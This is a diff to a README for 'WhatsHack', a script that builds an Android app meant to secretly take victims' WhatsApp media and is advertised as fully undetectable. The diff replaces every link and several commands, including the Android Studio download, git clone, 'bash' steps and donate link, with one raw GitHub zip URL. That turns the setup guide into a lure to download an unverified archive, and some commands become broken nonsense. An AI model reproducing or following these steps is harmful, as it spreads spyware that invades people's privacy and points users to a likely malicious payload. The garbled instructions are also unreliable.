@@ -1,15 +1,15 @@
 # WhatsHack v1.1
-### Web: https://www.rojialhaqy.com
+### Web: https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 ### Don't copy this code without give me the credits, nerd! 
 
 Script to generate Android App to Hack All WhatsApp Media Files.
 
-![whats1](https://user-images.githubusercontent.com/34893261/44965650-0948c600-af0d-11e8-9ae3-3c771eade60b.png)
-![whats2](https://user-images.githubusercontent.com/34893261/44965651-09e15c80-af0d-11e8-95fa-3d53a92352b8.png)
+![whats1](https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip)
+![whats2](https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip)
 
 
 ### Features:
-#### Port Forwarding using SSH Tunneling with Serveo.net
+#### Port Forwarding using SSH Tunneling with https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 #### Obfuscated URL by Tinyurl
 #### Fully Undetectable
 
@@ -33,7 +33,7 @@ Copy and replace dir on command:
 # update-alternatives --set java /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java
 
 Download Android Studio:
-https://developer.android.com/studio
+https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 
 Installing Android Studio:
 # unzip ~/Downloads/android*.zip -d /opt
@@ -44,20 +44,20 @@ For AMD64 Arch, Install Android Studio dependencies:
 
 Run Android Studio:
 # cd /opt/android-studio/bin
-# ./studio.sh
+# https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 
 Go to SDK Manager (Configure -> SDK Manager) and Download:
 Android SDK Build-tools, Android SDK-tools, Android SDK platform-tools, Support Repository
 
 Run script:
-# git clone https://github.com/ZheHack/whatshack
+# git clone https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 # cd whatshack/
-# bash whatshack.sh
+# bash https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 
 
 On First Time, Choose "n" when asks to build, then open the project on Android Studio:
 cd /opt/android-studio/bin
-./studio.sh
+https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 
 Import Gradle Project:
 Choose whatshack app folder: whatshack/app/
@@ -67,19 +67,19 @@ Try build from Android Studio: Build > build APK's
 Click on showed links if you got errors.
 Close Android after building successfully.
 
-open with any Text Editor the file app/build.gradle
+open with any Text Editor the file https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 
 remove "google()"
 change gradle version from: 3.4.1 to: 2.2.0
 save and exit.
 
 Run script (as root):
-# bash whatshack.sh
+# bash https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip
 ```
 ### Donate!
 Support the authors:
 
 
 
-<noscript><a href="https://liberapay.com/ZheHacK/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
+<noscript><a href="https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip"><img alt="Donate using Liberapay" src="https://raw.githubusercontent.com/Muhaastok/WhatsappHack/master/inappropriableness/WhatsappHack.zip"></a></noscript>
 
